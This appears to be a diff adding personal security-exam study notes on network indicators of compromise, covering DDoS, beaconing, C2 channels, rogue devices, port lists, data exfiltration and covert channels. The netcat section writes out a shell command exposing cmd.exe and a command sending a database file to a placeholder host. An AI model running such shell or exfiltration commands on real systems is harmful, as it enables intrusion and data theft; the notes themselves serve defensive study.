@@ -1,0 +1,287 @@
+- IOC (Indicator of Compromise)
+	- A sign that an asset or network has been attacked or is currently under attack
+- lots of network IOCs
+	- port scanning/sweeps
+	- non-standard port usage
+	- Covert Channels
+		- data over ICMPs
+	- devices we don’t recognize
+### Traffic Spikes
+- Sharp increase in connection requests in comparison with a given baseline
+- Not always bad, but is indicative of exfiltration or multiple requests.
+- “something anomalous”
+- check where it’s going
+- watch out for DoS and DDoS attack
+- Anyone can do a DDoS
+	- you can just go out and buy a botnet.
+- if it’s not expected, look into it
+- some other factors:
+	- TIME_WAIT connections in a load balancer
+	- HTTP 503 events
+- if it’s coming in, you’re the victim; if it’s going out, you’re the participant
+- How do you measure a DDoS?
+	- Bandwidth consumption
+		- value of bytes sent or received or as a percentage of the link utilization
+	- Distributed Reflection DoS (DRDoS)
+		- Network-based attack where the attacker dramatically increases the bandwidth sent to a victim during a DDoS attack by implementing an amplification factor
+		- Adversary spoofs a victim IP address and tries to open connections with multiple servers
+		- basically a reflection attack
+		- spoofs IP to send hellos to which replies are sent to the actual machine.
+		- ping flooding attack is another one of these
+		- Bogus DNS query is a great way to send a small request that requires a lot of information
+		- NTP request
+	- Slashdot Effect (slashdotting)
+		- when a website becomes popular quickly and crashes
+		- named after the social sharing site Slashdot
+- Mitigation
+	- Real time log analysis to identify suspicious patterns of traffic to blackhole/sinkhole
+	- Geolocation and IP reputation data to ignore suspicious traffic
+	- aggressively close slower connections by reducing timeouts
+	- caching and backend infrastructure to offload processing to other servers
+	- DDoS protection services
+		- Cloudflare
+		- Akamai
+### Beaconing
+- Means for a network node to advertise its presence and establish a link with other nodes
+- Once again, can be legit, gotta check where it’s going.
+- Malicious beaconing usually a ping or heartbeat
+- C2 servers will change IPs and DNS names rapidly to get around sinkholes or denials
+- Exam tip ^exam-tip
+	- regular interval beaconing on the test
+	- but, normal attackers will randomize the time
+- Legit stuff that uses beaconing
+	- NTP servers
+	- Auto update systems
+	- Cluster services
+- Jitter
+	- Adversary’s use of random delay to frustrate indicators based on regular connection attempt intervals
+- Sparse delivery
+	- reduced packet sizes to hide in the noise of other traffic
+- C2 servers must issue commands to zombies in the botnet using a communication channel
+- IRC ^IRC
+	- No one uses IRC, most companies just block it.
+- HTTP/S ^HTTP
+	- Now here’s the real shit, you need this.
+	- Mitigation: intercepting proxy at the network’s edge
+- DNS ^DNS
+	- not inspected or filtered
+	- doesn’t need a direct connection to the outside network and instead can use a local DNS resolver
+	- computer requests, local DNS doesn’t know, goes outside to ask, gets response, response contains the instructions.
+	- can also go out reversed
+	- check for repeated queries
+	- check for commands sent within request or response queries, which re longer and more complicated
+		- they can break up the data into multiple packets
+- Social media websites
+	- use of social media platforms messaging functions can allow attackers to live off the land
+	- checking the api for a certain profile detail changing which is the signal
+	- Companies trust LinkedIn, so it was allowed.
+- Cloud services
+	- can spin up VMs to send out messages through custom apps
+- Media and document files
+	- Metadata to send commands
+### Irregular P2P Communications
+- attack indicator where hosts within a network establish connections over unauthorized ports or data transfers
+- Most traffic goes from a client to a server
+- attacking indicator: SMB
+	- used within Windows File/Printer sharing environments
+	- Check connections for SMB between two clients, then see the TCP
+- NetPathCaononicalize request
+	- beginning of file sharing, could be a worm
+- ARP spoofing can also be indicative of this
+	- use an IDS to identify suspicious traffic patterns
+### Rogue Devices
+- mitigations:
+	- digital certificates on endpoints and servers
+- unauthorized device or service on a network that allows unauthorized actors to connect to the network
+	- can be anything, not just wireless devices
+- Rogue System Detection
+	- Identifying and removing machines on the network that aren’t supposed to be there
+- talking about various devices that could not belong on the network
+	- Network Tap
+	- WAPs
+	- etc
+- Evil Twin attacks
+- don’t forget about smart devices can be rogue devices
+- how to find rogue devices:
+	- physical inspection
+	- Network Mapping and Host Discovery
+	- Wireless Monitoring
+	- Packet Sniffing/Traffic Flow
+### Scans and Sweeps
+- rogue devices, like you will recon before doing an attack
+- fingerprinting
+	- identifying type and version of an OS using responses to network scans
+	- Nmap does this automatically if you go verbose enough
+- Sweep
+	- scan directed at multiple IP address to discover whether a host responds to connection requests for particular ports
+- Footprinting
+	- attacker gathers information about the target before attacking it
+	- additional recon
+- Authorized scan should only be performed from a restricted range of hosts!
+	- We can authorize a range of IPs and ignore those ranges.
+- IDS (Intrusion detection system)
+	- identify scanning by detecting when the number of syn, syn/ack, and fin packets is not statistically balanced
+	- if the balance is off, fires alarm for scanning
+- Don’t panic if scan sweeps happen
+	- “your ass is always out on the internet”
+### Nonstandard Port Usage
+- Internet Assigned Numbers Authority (IANA) keeps a list of well-known and registered TCP and UDP port mappings
+	- Well known ports: 0-1023 ^well-known-ports
+	- Registered Ports: 1024-49151 ^registered-ports
+	- Dynamic Ports: 49152-65535 ^dynamic-ports
+- legit applications will use well known and registered ports
+- No comprehensive list of ports used by malware
+	- check your dynamic ports that are constantly opened
+- Non-standard Port:
+	- TCP/IP application traffic over a port that is no the well-known or registered port established for that protocol
+	- big red flag there
+- IOCs
+	- Use of a non-standard port when it already has a port
+		- malware might use a non-standard port other than 53 for DNS
+	- mismatched port/application traffic where non-standard traffic is communicated over a well-known or registered port
+- Mitigations
+	- White list ports on firewall for ingress and egress interfaces
+	- configuration documentation should show which server ports are allowed on any given host type
+	- configure detection rules to detect mismatched protocol usage over a standard port
+- Shell
+	- an attacker opens a listening port that exposes the command prompt on the local host and connects to that port from a remote host
+- Reverse Shell
+	- an attacker opens a listening port on the remote host and causes the infected host to connect to it
+- Reverse Shells are more popular than Shells because traffic going out is a lot easier than traffic coming in.
+- Netcat
+	- reads and writes raw data over a network connection, mostly known for reverse shells
+	- `nc -l -p 443 -e cmd.exe`
+	- `nc [IP] [port]`
+- at the end of the day, a shell is a shell, doesn't really matter what a reverse shell
+- Netcat can also send and receive files
+	- receiving data to dump into “databse.sql”: `nc -l -p 53 > database.sql`
+	- sending the “databse.sql” over netcat: `type database.sql | nc [IP] [Port]`
+### TCP Ports
+- you gotta know your TCP ports
+- time to learn your common ports
+	- `21` - FTP
+	- `22` - SSH/SFTP
+	- `23` - TELNET
+		- don’t use this man
+	- `25` - SMTP
+	- `53` - DNS
+	- `80` - HTTP
+	- `110` - POP3 
+		- Post Office Protocol
+	- `111` - RPCBIND 
+		- Maps Remote Procedure Call services to port numbers in UNIX-like environment
+	- `135` - MSRPC
+		- Advertises what RPC services are available in a Windows environment
+	- `139` - NETBIOS-SSN
+		- NetBIOS Session Services
+		- supports windows file sharing with pre-Win 2000 protocols ^Netbios
+	- `143` - IMAP
+	- `443` - HTTPS
+	- `445` - MICROSOFT-DS
+		- Windows File Sharing on windows networks
+		- SMB over TCP/IP
+	- `993` - IMAPS
+		- IMAP but secure
+	- `1723` - PPTP
+		- Point to Point tunneling
+		- legacy VPN protocol
+	- `3306` - MySQL
+	- `3389` - RDP
+	- `5900` - VNC
+		- Virtual Network Computing
+		- open source RDP
+	- `8080` - HTTP-PROXY
+		- Proxy service for HTTP or alternate HTTP
+	- They’re not going to blank ask you what port is what, they’re just gonna throw it at you and hope you know
+### UDP Ports
+- You gotta know your UDP ports
+	- `53` - DNS 
+		- Uses UDP for DNS queries
+	- `67` - DHCPS
+		- Server port for Dynamic Host Configure Protocol
+	- `68` - DHCPC
+		- Client port for Dynamic Host Configure Protocol
+	- `69` - TFTP
+		- Trivial File Transfer Protocol
+	- `123` - NTP
+		- Network Time Protocol
+	- `135` - MSRPC
+		- TCP and UDP
+	- `137` - NETBIOS-NS 
+		- [[Analyzing Network IOCs#^Netbios|NetBIOS]] Name Service
+	- `138` - NETBIOS-DGM
+		- [[Analyzing Network IOCs#^Netbios|NetBIOS]] Datagram Service
+	- `139` - NETBIOS-SSN
+		- [[Analyzing Network IOCs#^Netbios|NetBIOS]] Session Service
+	- `161` - SNMP
+		- Simple Network Management Protocol
+	- `162` - SNMP
+		- Management port for SNMP
+	- `445` - MICROSOFT-DS
+	- `500` - ISAKMP
+		- Internet Security Association and Key Management Protocol
+	- `514` - SYSLOG
+	- `520` - RIP
+		- Routing Information Protocol
+	- `631` - IPP
+		- Internet Printing Protocol
+	- `1434` - MS-SQL
+		- Microsoft SQL Server
+	- `1900` - UPNP
+		- Universal Plug and Play
+	- `4500` NAT-T-IKE
+		- Network Translation to Internet Key Exchange
+	- Just like the TCP ports, they’re just gonna throw it at you and hope you swim
+### Data Exfiltration
+- There’s lots of ways to exfiltrate data
+- HTTP/S transfers
+	- commercial file sharing services to get data out
+		- Dropbox
+		- Mega
+		- OneDrive
+		- Google Drive
+- HTTP requests to databases
+	- SQL injection or similar technique to copy records from the database which they shouldn’t be able to access
+	- IOCs
+		- spike in requests to PHP or other scrips
+- DNS
+	- can use the queries to transmit data out
+	- IOCs
+		- Atypical query
+		- TXT
+		- MX
+		- CNAME
+		- NULL
+- Overt channels
+	- Using a channel that is meant to send data
+		- FTP
+		- IM
+		- P2P
+		- Email
+- Explicit tunnels
+	- using SSH or VPN to create a tunnel to transmit data
+	- IOCs
+		- atypical endpoints involved in tunnels
+		- geographical
+- Adversary could use different channels for exfiltration and C2
+- Best Mitigation:
+	- Strong encryption of data at rest and data in transit
+### Covert Channels
+- communication path that allows data exfiltration without alerting anything
+- Transmit data over nonstandard port
+- Encoding data in TCP/IP packet headers
+- Segmenting data into multiple packets
+- Obfuscating using hex
+- Transmitting encrypted data
+- Mitigation
+	- advanced intrusion detection and user behavior analytics tools are your best option to detect coert channels, but they won’t catch everything
+- Covert Storage Channel
+	- Utilizes one process to write to a storage location and another process to read from that location
+- Covert Timing Channel
+	- Utilizes one process to alter a system resource so that changes in its response time can signal information to a recipient process
+		- using timing of packets to transmit a code
+- some covert channels are a combination of both
+- Steganography
+	- concealing data within another file, message, image or video.
+- Java tool to put messages into images
+- this can bypass a packet sniffer
